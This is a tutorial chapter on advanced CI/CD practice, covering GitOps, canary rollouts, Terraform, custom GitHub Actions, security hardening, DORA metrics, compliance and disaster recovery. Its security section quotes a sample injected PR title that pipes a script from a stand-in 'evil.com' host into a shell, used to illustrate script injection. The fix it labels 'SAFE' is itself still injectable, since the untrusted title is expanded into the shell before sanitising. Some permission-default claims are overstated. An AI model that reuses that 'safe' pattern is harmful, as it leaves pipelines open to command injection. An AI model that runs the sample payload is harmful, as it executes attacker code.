# Chapter 12 — Advanced Concepts

## Learning Objectives

By the end of this chapter, you will be able to:

- Understand GitOps principles and implement a pull-based deployment workflow
- Configure progressive delivery with canary deployments using Argo Rollouts
- Run Terraform infrastructure provisioning safely inside CI/CD
- Build custom GitHub Actions in JavaScript
- Harden pipeline security with least-privilege permissions and pinned action SHAs
- Collect pipeline observability metrics and track delivery performance
- Meet compliance requirements for audit trails, signed artifacts, and deployment approvals
- Plan disaster recovery when the CI/CD system itself is unavailable

---

## 12.1 GitOps — Git as the Source of Truth

Traditional CI/CD uses a **push-based** deploy model: the pipeline SSHes into a server (or calls a cloud API) to apply changes. This works but has problems — the pipeline needs broad credentials, it is hard to audit what is running where, and rollback requires re-running a pipeline.

**GitOps introduces a pull-based model:**

```
Traditional push-based deploy:
CI pipeline → SSH into server → run deploy script → cluster updated

GitOps pull-based deploy:
Developer → git push → Git repo ← GitOps agent polls → applies to cluster
                                   (ArgoCD / Flux)
```

**Core principles:**

- The Git repo is the **desired state**; the cluster is the **actual state**
- A GitOps agent (ArgoCD, Flux) continuously compares actual to desired and reconciles any drift
- Rollback = `git revert` — the same mechanism as any code change
- Full audit trail: every change to the cluster is traceable to a git commit with author, timestamp, and PR link

**CI + GitOps workflow:**

```yaml
jobs:
  deploy:
    steps:
      - name: Build and push image
        run: |
          docker build -t ghcr.io/myorg/myapp:${{ github.sha }} .
          docker push ghcr.io/myorg/myapp:${{ github.sha }}

      - name: Update Kubernetes manifest
        run: |
          git clone https://github.com/myorg/k8s-manifests.git
          cd k8s-manifests
          sed -i "s|image: .*|image: ghcr.io/myorg/myapp:${{ github.sha }}|" \
            apps/myapp/deployment.yaml
          git add -A
          git commit -m "chore: update myapp to ${{ github.sha }}"
          git push
      # ArgoCD detects the change and applies the new manifest automatically
```

The CI pipeline never touches the cluster directly. It only updates the manifest repository. ArgoCD does the rest.

**App-of-apps pattern:** For large systems, ArgoCD's app-of-apps pattern allows a single root application to manage dozens of child applications, each pointing to its own manifest directory. Changes to individual services only affect their own ArgoCD app.

---

## 12.2 Progressive Delivery with Argo Rollouts

Argo Rollouts extends Kubernetes deployments with traffic-splitting capabilities, enabling canary and blue/green strategies with automated analysis gates.

```yaml
# Argo Rollout spec — canary strategy
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: myapp
spec:
  replicas: 10
  strategy:
    canary:
      steps:
        - setWeight: 5         # send 5% of traffic to new version
        - pause: {duration: 10m}
        - analysis:            # run automated analysis
            templates:
              - templateName: success-rate
        - setWeight: 50        # 50% if analysis passes
        - pause: {duration: 5m}
        - setWeight: 100       # full rollout
      autoPromotionEnabled: false   # require explicit manual promotion
```

**Analysis template — check success rate against Prometheus:**

```yaml
apiVersion: argoproj.io/v1alpha1
kind: AnalysisTemplate
metadata:
  name: success-rate
spec:
  metrics:
    - name: success-rate
      interval: 2m
      successCondition: result[0] >= 0.95
      failureLimit: 3
      provider:
        prometheus:
          address: http://prometheus.monitoring.svc:9090
          query: |
            sum(rate(http_requests_total{app="myapp",status!~"5.."}[2m]))
            /
            sum(rate(http_requests_total{app="myapp"}[2m]))
```

If the success rate drops below 95% during the canary phase, Argo Rollouts automatically aborts and rolls back to the stable version — no human intervention needed.

---

## 12.3 Infrastructure Provisioning in CI

Terraform in CI follows a **plan → review → apply** pattern. The plan is always computed and uploaded as an artifact; the apply only runs after approval.

```yaml
jobs:
  plan:
    runs-on: ubuntu-latest
    outputs:
      has-changes: ${{ steps.plan.outputs.has-changes }}
    steps:
      - uses: actions/checkout@v4
      - uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: 1.9.0
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.TF_ROLE_ARN }}
          aws-region: us-east-1
      - run: terraform init
      - id: plan
        run: |
          terraform plan -out=tfplan -detailed-exitcode
          echo "has-changes=$?" >> $GITHUB_OUTPUT
        continue-on-error: true   # exit code 2 = changes present (not an error)
      - uses: actions/upload-artifact@v4
        with:
          name: tfplan
          path: tfplan
          retention-days: 1       # plan is stale after 1 day

  apply:
    needs: plan
    if: needs.plan.outputs.has-changes == '2'   # only if changes exist
    environment: production                      # requires reviewer approval
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: hashicorp/setup-terraform@v3
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.TF_ROLE_ARN }}
          aws-region: us-east-1
      - uses: actions/download-artifact@v4
        with:
          name: tfplan
      - run: terraform init
      - run: terraform apply tfplan
```

**Terraform exit codes:**

- `0` — succeeded, no changes
- `1` — error
- `2` — succeeded, changes present

**State locking:** Never run concurrent Terraform applies against the same state file. Use DynamoDB state locking (for S3 backends) or Terraform Cloud to serialize applies.

---

## 12.4 Custom GitHub Actions

When you find yourself copy-pasting the same multi-step logic across repositories, it is time to extract it into a custom action.

**Three action types:**

| Type | Language | Startup time | Best for |
|---|---|---|---|
| JavaScript | Node.js | Fast (~1s) | API calls, GitHub SDK usage |
| Docker | Any | Slow (~30s) | Complex tooling, specific OS dependencies |
| Composite | YAML | Fast | Wrapping existing steps |

**JavaScript action example:**

```javascript
// action.js
const core = require('@actions/core');
const github = require('@actions/github');

async function run() {
  const token = core.getInput('github-token', { required: true });
  const message = core.getInput('message');
  const octokit = github.getOctokit(token);
  const { context } = github;

  if (!context.issue.number) {
    core.warning('Not running in a pull request context — skipping comment');
    return;
  }

  const comment = await octokit.rest.issues.createComment({
    ...context.repo,
    issue_number: context.issue.number,
    body: message,
  });

  core.setOutput('comment-id', comment.data.id.toString());
  core.info(`Comment posted: ${comment.data.html_url}`);
}

run().catch(core.setFailed);
```

```yaml
# action.yml
name: PR Commenter
description: Posts or updates a comment on the current pull request
inputs:
  github-token:
    description: GitHub token with pull-requests:write permission
    required: true
  message:
    description: Markdown body of the comment
    required: true
outputs:
  comment-id:
    description: ID of the created comment
runs:
  using: node20
  main: action.js
```

**Publishing:** Commit `action.yml`, `action.js`, and `node_modules` to a public repository and tag a release. Other workflows reference it as `uses: myorg/my-action@v1`.

**Vendoring node_modules:** GitHub Actions requires the `node_modules` directory to be committed — there is no `npm install` step during action execution. Use `@vercel/ncc` to bundle everything into a single `dist/index.js`:

```bash
npx @vercel/ncc build action.js -o dist
# Reference dist/index.js in action.yml instead of action.js
```

---

## 12.5 Pipeline Security Hardening

CI/CD systems are high-value targets. These practices reduce the attack surface.

**Declare minimal permissions:**

```yaml
# Top-level default: read-only
permissions:
  contents: read

jobs:
  build:
    permissions:
      contents: read
      packages: write   # only what this specific job needs
  release:
    permissions:
      contents: write   # needed to create GitHub release
      id-token: write   # needed for OIDC
```

If `permissions` is not declared at all, the default is `write-all` — a significant over-permission.

**Pin actions to commit SHA, not a tag:**

```yaml
# Tags are mutable — an attacker who compromises the action repo can move the tag
- uses: actions/checkout@v4                                              # RISKY

# SHAs are immutable — this exact commit will always be used
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683      # v4.2.2
- uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567   # v3.3.0
```

Use `pin-github-action` or `Dependabot` to manage SHA pinning automatically.

**Prevent script injection via PR inputs:**

```yaml
# DANGEROUS — PR title is attacker-controlled
- run: echo "Title: ${{ github.event.pull_request.title }}"

# SAFE — sanitize before use
- run: |
    SAFE_TITLE=$(echo "${{ github.event.pull_request.title }}" | sed 's/[^a-zA-Z0-9 ._-]//g')
    echo "Title: $SAFE_TITLE"
```

A malicious PR title like `"; curl https://evil.com/steal.sh | sh; echo "` would execute if passed directly to `run`.

**Use environment files, not deprecated commands:**

```yaml
# SAFE — append to GITHUB_ENV
echo "VAR=value" >> $GITHUB_ENV

# DEPRECATED — vulnerable to injection, blocked on newer runners
echo "::set-env name=VAR::value"
```

---

## 12.6 Pipeline Observability

Knowing a pipeline passed or failed is table stakes. Understanding *why* it is slow, *which* jobs fail most often, and *whether* deployment frequency is improving requires metrics.

**Custom metrics reporting:**

```yaml
- name: Report pipeline metrics
  if: always()
  run: |
    END_TIME=$(date +%s)
    DURATION=$(( END_TIME - ${{ env.PIPELINE_START_TIME }} ))
    curl -X POST https://metrics.mycompany.com/ci/runs \
      -H "Content-Type: application/json" \
      -d '{
        "pipeline":    "${{ github.workflow }}",
        "repo":        "${{ github.repository }}",
        "branch":      "${{ github.ref_name }}",
        "sha":         "${{ github.sha }}",
        "status":      "${{ job.status }}",
        "duration_s":  '"$DURATION"',
        "actor":       "${{ github.actor }}",
        "run_number":  ${{ github.run_number }}
      }'
```

**Set pipeline start time early:**

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      start-time: ${{ steps.start.outputs.time }}
    steps:
      - id: start
        run: echo "time=$(date +%s)" >> $GITHUB_OUTPUT
```

**Four key DORA metrics to track:**

| Metric | What it measures | Target (elite) |
|---|---|---|
| Deployment frequency | How often code reaches production | Multiple times per day |
| Lead time for changes | Commit to production time | Less than 1 hour |
| Change failure rate | % of deployments causing incidents | Less than 5% |
| MTTR | Time to recover from a failure | Less than 1 hour |

Track these in a dashboard (Grafana, Datadog, or even a spreadsheet) and review trends weekly with the team.

---

## 12.7 Compliance and Audit in CI/CD

Regulated industries (finance, healthcare, government) impose controls on how software is deployed. CI/CD systems must enforce and document these controls automatically.

**Compliance checklist:**

```
Code and review controls
  - All deployments require an approved pull request
  - Direct pushes to main/release branches are blocked via branch protection
  - Minimum 2 reviewer approvals required for production deployments
  - Code owners defined in CODEOWNERS for sensitive paths

Audit trail
  - Git history records who changed what and when
  - Pipeline logs retained for 90+ days
  - Deployment events logged to immutable audit store (CloudTrail, Splunk)

Identity and integrity
  - Signed commits (GPG) proving code author identity
  - Signed container images (Cosign/Sigstore) proving image origin
  - SBOM (Software Bill of Materials) generated per release

Policy as code
  - OPA/Conftest checks run in CI to validate Kubernetes manifests
  - Terraform Sentinel policies to enforce cloud resource constraints
  - Example: reject any deployment that does not set resource limits

Artifact security
  - Immutable image tags in registry (no overwriting :latest)
  - Vulnerability scanning before push (Trivy, Grype)
  - Secrets never stored in image layers

Access management
  - Secrets never logged (masking + secret scanning gate)
  - OIDC preferred over long-lived credentials
  - Quarterly access reviews: who has what permissions
```

**Signing images with Cosign:**

```yaml
- uses: sigstore/cosign-installer@v3
- run: |
    cosign sign --yes ghcr.io/myorg/myapp:${{ github.sha }}
```

Downstream systems can then verify the image was built by an authorized pipeline before running it.

---

## 12.8 Disaster Recovery for CI/CD Systems

The CI/CD system is itself infrastructure that can fail. What happens when GitHub Actions is unavailable, or the self-hosted runner fleet is down?

**Failure scenarios and mitigations:**

```
Scenario: GitHub Actions UI is down (SaaS outage)
  - Self-hosted runners still process queued jobs if the Actions API is up
  - Monitor status.githubstatus.com; subscribe to incident notifications
  - Mitigation: maintain a runbook for manual deployment as fallback

Scenario: All runners are unavailable (networking, capacity)
  - Maintain a separate emergency Jenkins instance or manual deployment scripts
  - Pre-build and push release images on schedule; deploy the last known-good image

Scenario: Secrets manager is unreachable
  - Keep an encrypted offline copy of critical credentials in a vault or HSM
  - Break-glass procedure: named individuals can access emergency credentials

Scenario: Corrupted pipeline configuration
  - Pin dependencies and action versions (Chapter 12.5)
  - Keep the previous workflow YAML version in git — rollback is a git revert

RTO target: can your team deploy a hotfix manually in under 30 minutes?
```

**Fire drill:** Quarterly, deliberately disable the CI system and practice deploying manually from documented runbooks. Identify gaps. Fix them before a real incident.

**Runbook template:**

```markdown
## Manual Deployment Runbook — myapp production

Prerequisites:
- AWS CLI configured with deploy role
- kubectl configured for production cluster
- Access to secrets in 1Password vault (break-glass entry: "myapp prod deploy")

Steps:
1. Pull the target image: docker pull ghcr.io/myorg/myapp:<SHA>
2. Verify image signature: cosign verify ghcr.io/myorg/myapp:<SHA>
3. Update deployment: kubectl set image deployment/myapp myapp=ghcr.io/myorg/myapp:<SHA>
4. Monitor rollout: kubectl rollout status deployment/myapp
5. Verify health: curl https://myapp.mycompany.com/healthz

Rollback:
  kubectl rollout undo deployment/myapp
```

---

## Summary

| Topic | Key Takeaway |
|---|---|
| GitOps | Git is desired state; ArgoCD/Flux reconciles; rollback = git revert |
| Progressive delivery | Canary + automated analysis gates catch regressions at low blast radius |
| Terraform in CI | Always plan first; upload plan artifact; apply requires environment approval |
| Custom actions | JavaScript actions are fastest; bundle with ncc; pin to SHA in consumers |
| Security hardening | Minimal permissions; SHA-pinned actions; sanitize PR inputs; no set-env |
| Observability | Track DORA metrics: deployment frequency, lead time, failure rate, MTTR |
| Compliance | Signed commits, signed images, SBOM, immutable artifacts, policy-as-code |
| DR | Document and test manual deployment runbooks quarterly |

---

## Knowledge Check

1. What is the fundamental difference between push-based and pull-based deployment models?
2. In the Argo Rollouts canary spec, what happens if the `success-rate` analysis fails during the 5% canary phase?
3. Why is `terraform plan -detailed-exitcode` important in CI, and what does each exit code mean?
4. Why should action tags like `@v4` be replaced with full commit SHAs in security-sensitive pipelines?
5. A deployment causes an incident in production. What git operation do you perform in a GitOps model to roll back, and what happens next?

---

## Hands-on Exercise

**Goal:** Implement an end-to-end GitOps workflow with image signing.

**Steps:**

1. Create two repositories: `myapp` (application code) and `myapp-manifests` (Kubernetes YAML)
2. In `myapp`, write a CI workflow that:
   - Builds and pushes an image tagged with the git SHA
   - Signs the image using Cosign keyless signing
   - Opens a PR against `myapp-manifests` that updates the image tag in `deployment.yaml`
3. In `myapp-manifests`, add a CI check that runs `cosign verify` on the image tag in any incoming PR before allowing merge
4. (Optional) Install ArgoCD on a local kind cluster and point it at the `myapp-manifests` repository — watch it sync automatically when the PR merges
5. Trigger a rollback by reverting the manifest PR and observe ArgoCD restore the previous image version

---

<div style="display:flex;justify-content:space-between;align-items:center;">
  <a href="11-intermediate-concepts.md">← Previous: Intermediate Concepts</a>
  <a href="./00-index.md">🏠 Index</a>
  <a href="13-best-practices.md">Next: Best Practices →</a>
</div>
